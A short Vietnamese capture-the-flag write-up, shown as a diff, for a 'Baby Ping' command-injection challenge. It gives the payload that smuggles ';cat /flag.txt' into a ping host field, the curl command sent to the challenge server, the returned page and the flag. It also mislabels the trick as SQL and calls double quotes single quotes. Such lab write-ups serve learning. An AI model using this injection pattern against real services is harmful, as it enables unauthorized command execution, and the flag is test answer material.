@@ -1,0 +1,79 @@
+Bài này thì ip được đưa vào dấu singke quotes ""
+Nên khi nhập gì vào nó cũng sẽ bị để trong dấu ""
+=> sử dụng kiến thức của sql là đóng 1 " và comment phần dấu " còn lại
+Payload: host=8.8.8.8";cat+/flag.txt;#
+
+┌──(kali㉿B21DCAT077-Giang-Kali)-[~/…/CTF_Basic/CHH_WEB/Baby SQLite With Filter/sql-injection-004]
+└─$ curl -d "host=8.8.8.8\";cat+/flag.txt;#" http://103.97.125.56:31614/ping
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:title" content="Baby Ping">
+  <meta property="og:description" content="Baby Ping">
+  <meta property="og:image" content="/static/main.png">
+  <meta content='summary_large_image' property='twitter:card'>
+  <meta property="og:url" content="https://cookiearena.org">
+
+  <title>Baby Ping</title>
+
+  <link rel="icon" href="/static/favicon.ico" type="image/x-icon" />
+  <link rel="shortcut icon" href="/static/favicon.ico" type="image/x-icon" />
+  <link rel="stylesheet" type="text/css" href="/static/index.css" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+    integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+</head>
+
+<body>
+  <div class="bg-top"></div>
+  <div class="wrapper h-100">
+    <div>
+      <div class="container text-center mt-5">
+        <img height="76px" class="img-responsive ctf_logo" src="/static/cookie.png" height="25" alt="Cookie Arena">
+      </div>
+    </div>
+    <div style="margin-top: 7rem;" class="container">
+      <fieldset>
+        <legend>Baby Ping</legend>
+              
+  <h1>Ping Result</h1><br/>
+  <div>
+    
+    <pre style="color: white">PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: seq=0 ttl=55 time=35.249 ms
+64 bytes from 8.8.8.8: seq=1 ttl=55 time=35.290 ms
+64 bytes from 8.8.8.8: seq=2 ttl=55 time=35.096 ms
+
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max = 35.096/35.211/35.290 ms
+CHH{C0MM4ND_1nj3C7ioN_pinG_e2ba0fda6277f2cee013f86ad8dc78b6}</pre>
+    
+  </div>
+  <a type="button" class="btn btn-cookie" href="javascript:history.back(-1);">Back</a>
+
+
+      </fieldset>
+    </div>
+    <footer class="footer fixed-bottom mb-5">
+      <div class="container text-center">
+        <a href="https://www.facebook.com/cookie.han.hoan" target="_blank" rel="norel noopener"><img width="24px"
+            height="24px" src="/static/facebook.png"></a>
+        <a class="ml-2" href="https://discord.gg/cookiehanhoan" target="_blank" rel="norel noopener"><img width="24px"
+            height="24px" src="/static/discord.png"></a>
+      </div>
+      <div class="container text-center mt-1">
+        <a href="https://battle.cookiearena.org" class="text-secondary" target="_blank" rel="norel noopener">
+          <small class="text-muted">Powered by Cookie Arena</small>
+        </a>
+      </div>
+    </footer>
+  </div>
+</body>
+
+</html>
+
+Flag: CHH{C0MM4ND_1nj3C7ioN_pinG_e2ba0fda6277f2cee013f86ad8dc78b6}
